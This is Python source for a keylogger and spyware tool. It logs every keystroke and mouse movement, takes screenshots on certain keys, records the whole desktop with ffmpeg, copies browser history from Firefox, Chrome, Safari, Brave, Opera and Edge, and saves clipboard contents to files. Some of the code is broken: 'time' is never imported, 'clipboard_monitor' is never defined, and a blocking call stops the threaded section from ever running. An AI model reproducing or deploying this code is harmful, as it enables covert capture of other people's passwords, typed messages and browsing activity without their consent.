import logging
import os
from datetime import datetime
import subprocess
import sys

from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from pynput.keyboard import Key

from browser_history import browsers

import keyboard
import pyperclip

class KeyLogger:
    def __init__(self):
        self.log_file = None
        self.setup_logger()
        self.dpi = 96

    def setup_logger(self):
        logging.basicConfig(filename='key_inputs.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
        self.log = logging.getLogger()

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == Key.space:
                current_key = "SPACE"
            elif key == Key.esc:
                current_key = "ESC"
            else:
                current_key = str(key)
        self.log.info(f"{current_key} pressed")

        if current_key == 's' or key == Key.enter:
            self.take_screenshot()

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.log.info(f"Mouse {action} at ({x}, {y}) with {button}")

    def on_move(self, x, y):
        x_cm = x / self.dpi * 2.54
        y_cm = y / self.dpi * 2.54
        self.log.info(f"Mouse moved to ({x_cm:.2f} cm, {y_cm:.2f} cm)")

    def on_scroll(self, x, y, dx, dy):
        x_cm = x / self.dpi * 2.54
        y_cm = y / self.dpi * 2.54
        dx_cm = dx / self.dpi * 2.54
        dy_cm = dy / self.dpi * 2.54
        self.log.info(f"Mouse scrolled at ({x_cm:.2f} cm, {y_cm:.2f} cm) with delta ({dx_cm:.2f} cm, {dy_cm:.2f} cm)")

    def start(self):
        keyboard_listener = Listener(on_press=self.on_press)
        mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)

        keyboard_listener.daemon = True
        mouse_listener.daemon = True

        keyboard_listener.start()
        mouse_listener.start()

        self.start_recording()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            keyboard_listener.stop()
            mouse_listener.stop()
            sys.exit(0)

    def take_screenshot(self):
        screenshots_dir = os.path.join(os.getcwd(), 'screenshots')
        if not os.path.exists(screenshots_dir):
            os.makedirs(screenshots_dir)

        screenshot = ImageGrab.grab()
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_filename = f'screenshot_{timestamp}.png'
        screenshot_path = os.path.join(screenshots_dir, screenshot_filename)
        screenshot.save(screenshot_path)
        self.log.info("Screenshot captured")

    def start_recording(self):
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        command = [
            'C:/ffmpeg/bin/ffmpeg.exe',
            '-f', 'gdigrab',
            '-framerate', '30',
            '-i', 'desktop',
            '-c:v', 'libx264',
            '-preset', 'ultrafast',
            f'screenrecord_{timestamp}.mp4'
        ]
        recording_process = subprocess.Popen(command)
        self.log.info("Screen recording started")
        self.fetch_and_save_browser_history()

    def fetch_and_save_browser_history(self):
        browser_classes = [browsers.Firefox, browsers.Chrome, browsers.Safari, browsers.Brave, browsers.Opera, browsers.Edge]
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        
        for Br in browser_classes:
            try:
                browser_instance = Br()
                history_entries = browser_instance.fetch_history()
            except Exception as ex:
                self.log.error(f"Error fetching history from {Br.name}: {ex}")
                continue

            if history_entries:
                history_dir = os.path.join(os.getcwd(), 'browser_histories')
                if not os.path.exists(history_dir):
                    os.makedirs(history_dir)

                history_file_path = os.path.join(history_dir, f"{Br.name}_history.txt")
                with open(history_file_path, "a") as file:
                    file.write("\n")
                    entries = history_entries.histories
                    for entry in entries:
                        file.write(f"{entry[0]} - {entry[1]}\n")
                self.log.info(f"{Br.name} history saved to {history_file_path}")
            else:
                self.log.info(f"No {Br.name} history found.")

class ClipboardMonitor:
    def __init__(self, interval=1):
        self.interval = interval
        self.previous_clipboard_content = pyperclip.paste()

    def save_clipboard_content(self, content):
        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
        content_to_save = f"{now.date()} - {now.time()} - \n{content}\n"

        clipboard_dir = os.path.join(os.getcwd(), 'Logs')
        if not os.path.exists(clipboard_dir):
            os.makedirs(clipboard_dir)

        with open(os.path.join(clipboard_dir, "clipboard_grap.txt"), "a") as file:
            file.write(content_to_save)
            file.write("\n")

    def start_monitoring(self):
        print("Clipboard monitoring started. Press 'Ctrl+Shift+Alt' to stop.")
        try:
            while True:
                clipboard_content = pyperclip.paste()
                if clipboard_content != self.previous_clipboard_content:
                    self.previous_clipboard_content = clipboard_content
                    self.save_clipboard_content(clipboard_content)
                    print("New clipboard content saved.")
                time.sleep(self.interval)
                if keyboard.is_pressed('ctrl') and keyboard.is_pressed('shift') and keyboard.is_pressed('alt'):
                    print("Clipboard monitoring stopped.")
                    break  # Exit the loop when the key combination is pressed
        except KeyboardInterrupt:
            print("Clipboard monitoring stopped.")

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
    import threading

    keylogger_thread = threading.Thread(target=keylogger.start)
    clipboard_monitor_thread = threading.Thread(target=clipboard_monitor.start_monitoring)

    keylogger_thread.start()
    clipboard_monitor_thread.start()

    keylogger_thread.join()
    clipboard_monitor_thread.join()